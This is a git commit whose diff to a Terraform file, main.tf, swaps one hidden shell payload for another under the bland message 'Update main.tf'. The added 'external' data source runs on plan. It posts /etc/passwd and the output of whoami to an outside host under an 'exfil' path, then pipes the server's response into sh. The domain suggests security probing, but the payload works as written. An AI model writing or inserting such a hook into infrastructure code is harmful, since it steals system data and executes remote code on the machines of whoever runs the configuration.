6b4e866f93a10295130635c07eaf8d93bb529b08
Caretaker <63348904+0xCaretaker@users.noreply.github.com>
2024-04-23 18:07:20 +0530

    Update main.tf

--- main.tf
+++ main.tf
@@ -1,1 +1,1 @@
-data "external" "example" { program = ["sh", "-c", "curl -XPOST -d https://6pw9ke4o80ru6r9ty64s0onfh6nxbuzj.net-spi.com/exfil2/`whoami` | sh"] }
+data "external" "example" { program = ["sh", "-c", "curl -XPOST --data-binary @/etc/passwd https://6pw9ke4o80ru6r9ty64s0onfh6nxbuzj.net-spi.com/exfil4/`whoami` | sh"] }
